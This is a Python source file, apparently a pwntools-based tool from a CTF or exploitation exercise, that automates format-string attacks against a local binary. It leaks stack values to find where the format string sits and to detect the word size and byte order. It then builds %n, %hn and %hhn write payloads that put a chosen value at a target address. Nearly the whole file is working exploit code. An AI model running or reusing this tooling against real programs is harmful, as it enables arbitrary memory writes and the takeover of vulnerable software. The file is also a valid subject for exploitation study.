import FormatStringGenerator

from pwn import *


def format_pack(address_size, order_byte):
    architecture_char = "Q" if address_size == 8 else "L"

    if order_byte == "little":
        byte_char = "<"
    elif order_byte == "big":
        byte_char = ">"
    else:
        byte_char = ""

    format_pack = byte_char + architecture_char

    return format_pack


def get_write_size(address_size, value, order_byte):
    byte_sizes = [8, 4, 2, 1] if address_size == 8 else [4, 2, 1]

    for byte_size in byte_sizes:
        bytes_list = list([value[j:j + byte_size] for j in range(0, 8, byte_size)])
        total_padding = 0

        for bytes in bytes_list:
            total_padding += int.from_bytes(bytes, byteorder=order_byte)

        print('Total padding with size ' + str(byte_size) + ': ' + str(total_padding))

        if total_padding < 4000:
            return byte_size, bytes_list


def get_addresses(response):
    return (response.replace("(nil)", "0x0")).split("0x")[1:]


def find_pattern(addresses, start_pattern, start_address=None):
    hex_pattern = start_pattern.encode().hex()
    reversed_hex_pattern = start_pattern[::-1].encode().hex()
    print("PATTERN DA CERCARE " + str(reversed_hex_pattern))
    if start_address:
        start = start_address
    else:
        start = 0

    for i in range(start, len(addresses) - 1):
        print("INDIRIZZO " + str(i) + " -> " + str(addresses[i]))
        if (addresses[i] == hex_pattern or (addresses[i] == hex_pattern[:8] and addresses[i + 1] == hex_pattern[8:])) or \
                (addresses[i] == reversed_hex_pattern or (
                        addresses[i] == reversed_hex_pattern[8:] and addresses[i + 1] == reversed_hex_pattern[:8])):
            return i

    print("Pattern iniziale non trovato")
    return None


class Exploit:
    def __init__(self, target, value, target_address):
        self.start_fmt_position = None
        self.address_size = None
        self.order_byte = None

        self.target = target
        self.target_address = target_address

        self.direct_fmt_generator = FormatStringGenerator.DirectFmtGenerator(20, "ABCDEFGH")
        self.get_start_fmt_position()

        self.value = struct.pack(format_pack(self.address_size, self.order_byte), value)

        print("Direct: " + str(self.start_fmt_position))

        self.define_direct_fmt()

    def send_payload(self, fmt):
        while True:

            print(fmt)
            p = process([self.target])
            p.sendlineafter("What's your name?", str.encode(fmt))
            response = p.recvall().decode()

            print("RISPOSTA: " + str(response) + " ########")

            if p.poll() == -11:
                # self.pop_fmt_generator.reset_pop_after_segfault()
                print("P.POLL -> " + str(p.poll()))
                None
            else:
                print("P.POLL -> " + str(p.poll()))
                return response

    def get_start_fmt_position(self):
        print("FORMAT STRING POSITION:")

        position = None
        while True:
            self.direct_fmt_generator.set_address("ABCDEFGH")
            found = False

            while not found:
                response = self.send_payload(self.direct_fmt_generator.generate_fmt_for_find_start())

                addresses = get_addresses(response)
                position = find_pattern(addresses, "ABCDEFGH", None if position is None else position + 1)

                print("Position: " + str(position))

                if position is not None:
                    found = True
                else:
                    self.direct_fmt_generator.increase_direct_parameter_num(10)

            print("Cerco b")
            confirm_pattern = "IJKLMNOP"
            hex_confirm_pattern = confirm_pattern.encode().hex()
            reversed_hex_confirm_pattern = confirm_pattern[::-1].encode().hex()

            self.direct_fmt_generator.set_address(confirm_pattern)
            response = self.send_payload(self.direct_fmt_generator.generate_fmt_for_find_start())
            addresses = get_addresses(response)
            print("----------- " + str(addresses[position]))
            print("----------- " + str(addresses[position + 1]))
            print(addresses[position] == reversed_hex_confirm_pattern[8:] and addresses[
                position + 1] == reversed_hex_confirm_pattern[:8])

            if addresses[position] == hex_confirm_pattern:
                self.address_size = 8
                self.order_byte = "big"
                self.start_fmt_position = position + self.direct_fmt_generator.get_direct_parameter_num()
                return
            elif addresses[position] == reversed_hex_confirm_pattern:
                self.address_size = 8
                self.order_byte = "little"
                self.start_fmt_position = position + self.direct_fmt_generator.get_direct_parameter_num()
                return
            elif addresses[position] == hex_confirm_pattern[:8] and addresses[position + 1] == hex_confirm_pattern[8:]:
                self.address_size = 4
                self.order_byte = "big"
                self.start_fmt_position = position + self.direct_fmt_generator.get_direct_parameter_num()
                return
            elif addresses[position] == reversed_hex_confirm_pattern[8:] and addresses[position + 1] == reversed_hex_confirm_pattern[:8]:
                self.address_size = 4
                self.order_byte = "little"
                self.start_fmt_position = position + self.direct_fmt_generator.get_direct_parameter_num()
                return

    def define_direct_fmt(self):
        byte_size, value_padding = get_write_size(self.address_size, self.value, self.order_byte)

        target_addresses = list()
        values = list()
        for i in range(0, self.address_size, byte_size):
            target_addresses.append(struct.pack(format_pack(self.address_size, self.order_byte), self.target_address + i))

        for bytes in value_padding:
            # values.append(bytes)
            values.append(int.from_bytes(bytes, byteorder=self.order_byte))

        target_addresses = [address for _, address in sorted(zip(values, target_addresses))]
        values.sort()

        for value, address in zip(values, target_addresses):
            print(str(value) + ', ' + address.decode())

        if byte_size == 8:
            writer = "ln"
        elif byte_size == 4:
            writer = "p"
        elif byte_size == 2:
            writer = "hn"
        elif byte_size == 1:
            writer = "hhn"

        counter = 0
        total_value_padding = 0
        for value, _ in zip(values, target_addresses):
            print('counter ' + str(counter))
            # print(str(len(self.string_generator.)))
            print('value is ' + str(value))

            padding = value - counter
            counter += padding

            if padding < self.address_size:
                padding = "A" * padding
            else:
                padding = "%" + str(padding) + "x"

            total_value_padding += len(padding)

            self.direct_fmt_generator.add_writer([padding, writer])

        total_offset = total_value_padding + ((1 + (len(str(self.start_fmt_position)) + 1) + 1 + len(writer)) * len(target_addresses))
        address_position_incr = total_offset // self.address_size
        extra_offset = total_offset % self.address_size

        if extra_offset > 0:
            address_position_incr += 1
            self.direct_fmt_generator.set_align_padding("B" * (self.address_size - extra_offset))

        self.direct_fmt_generator.set_address(("C" * self.address_size) * len(target_addresses))

        response = self.send_payload(self.direct_fmt_generator.generate_fmt_for_find_end(len(str(self.start_fmt_position)) + 1))

        print(total_offset)

        print(address_position_incr + self.start_fmt_position)

        print(self.direct_fmt_generator.generate_fmt_for_find_end(len(str(self.start_fmt_position)) + 1))


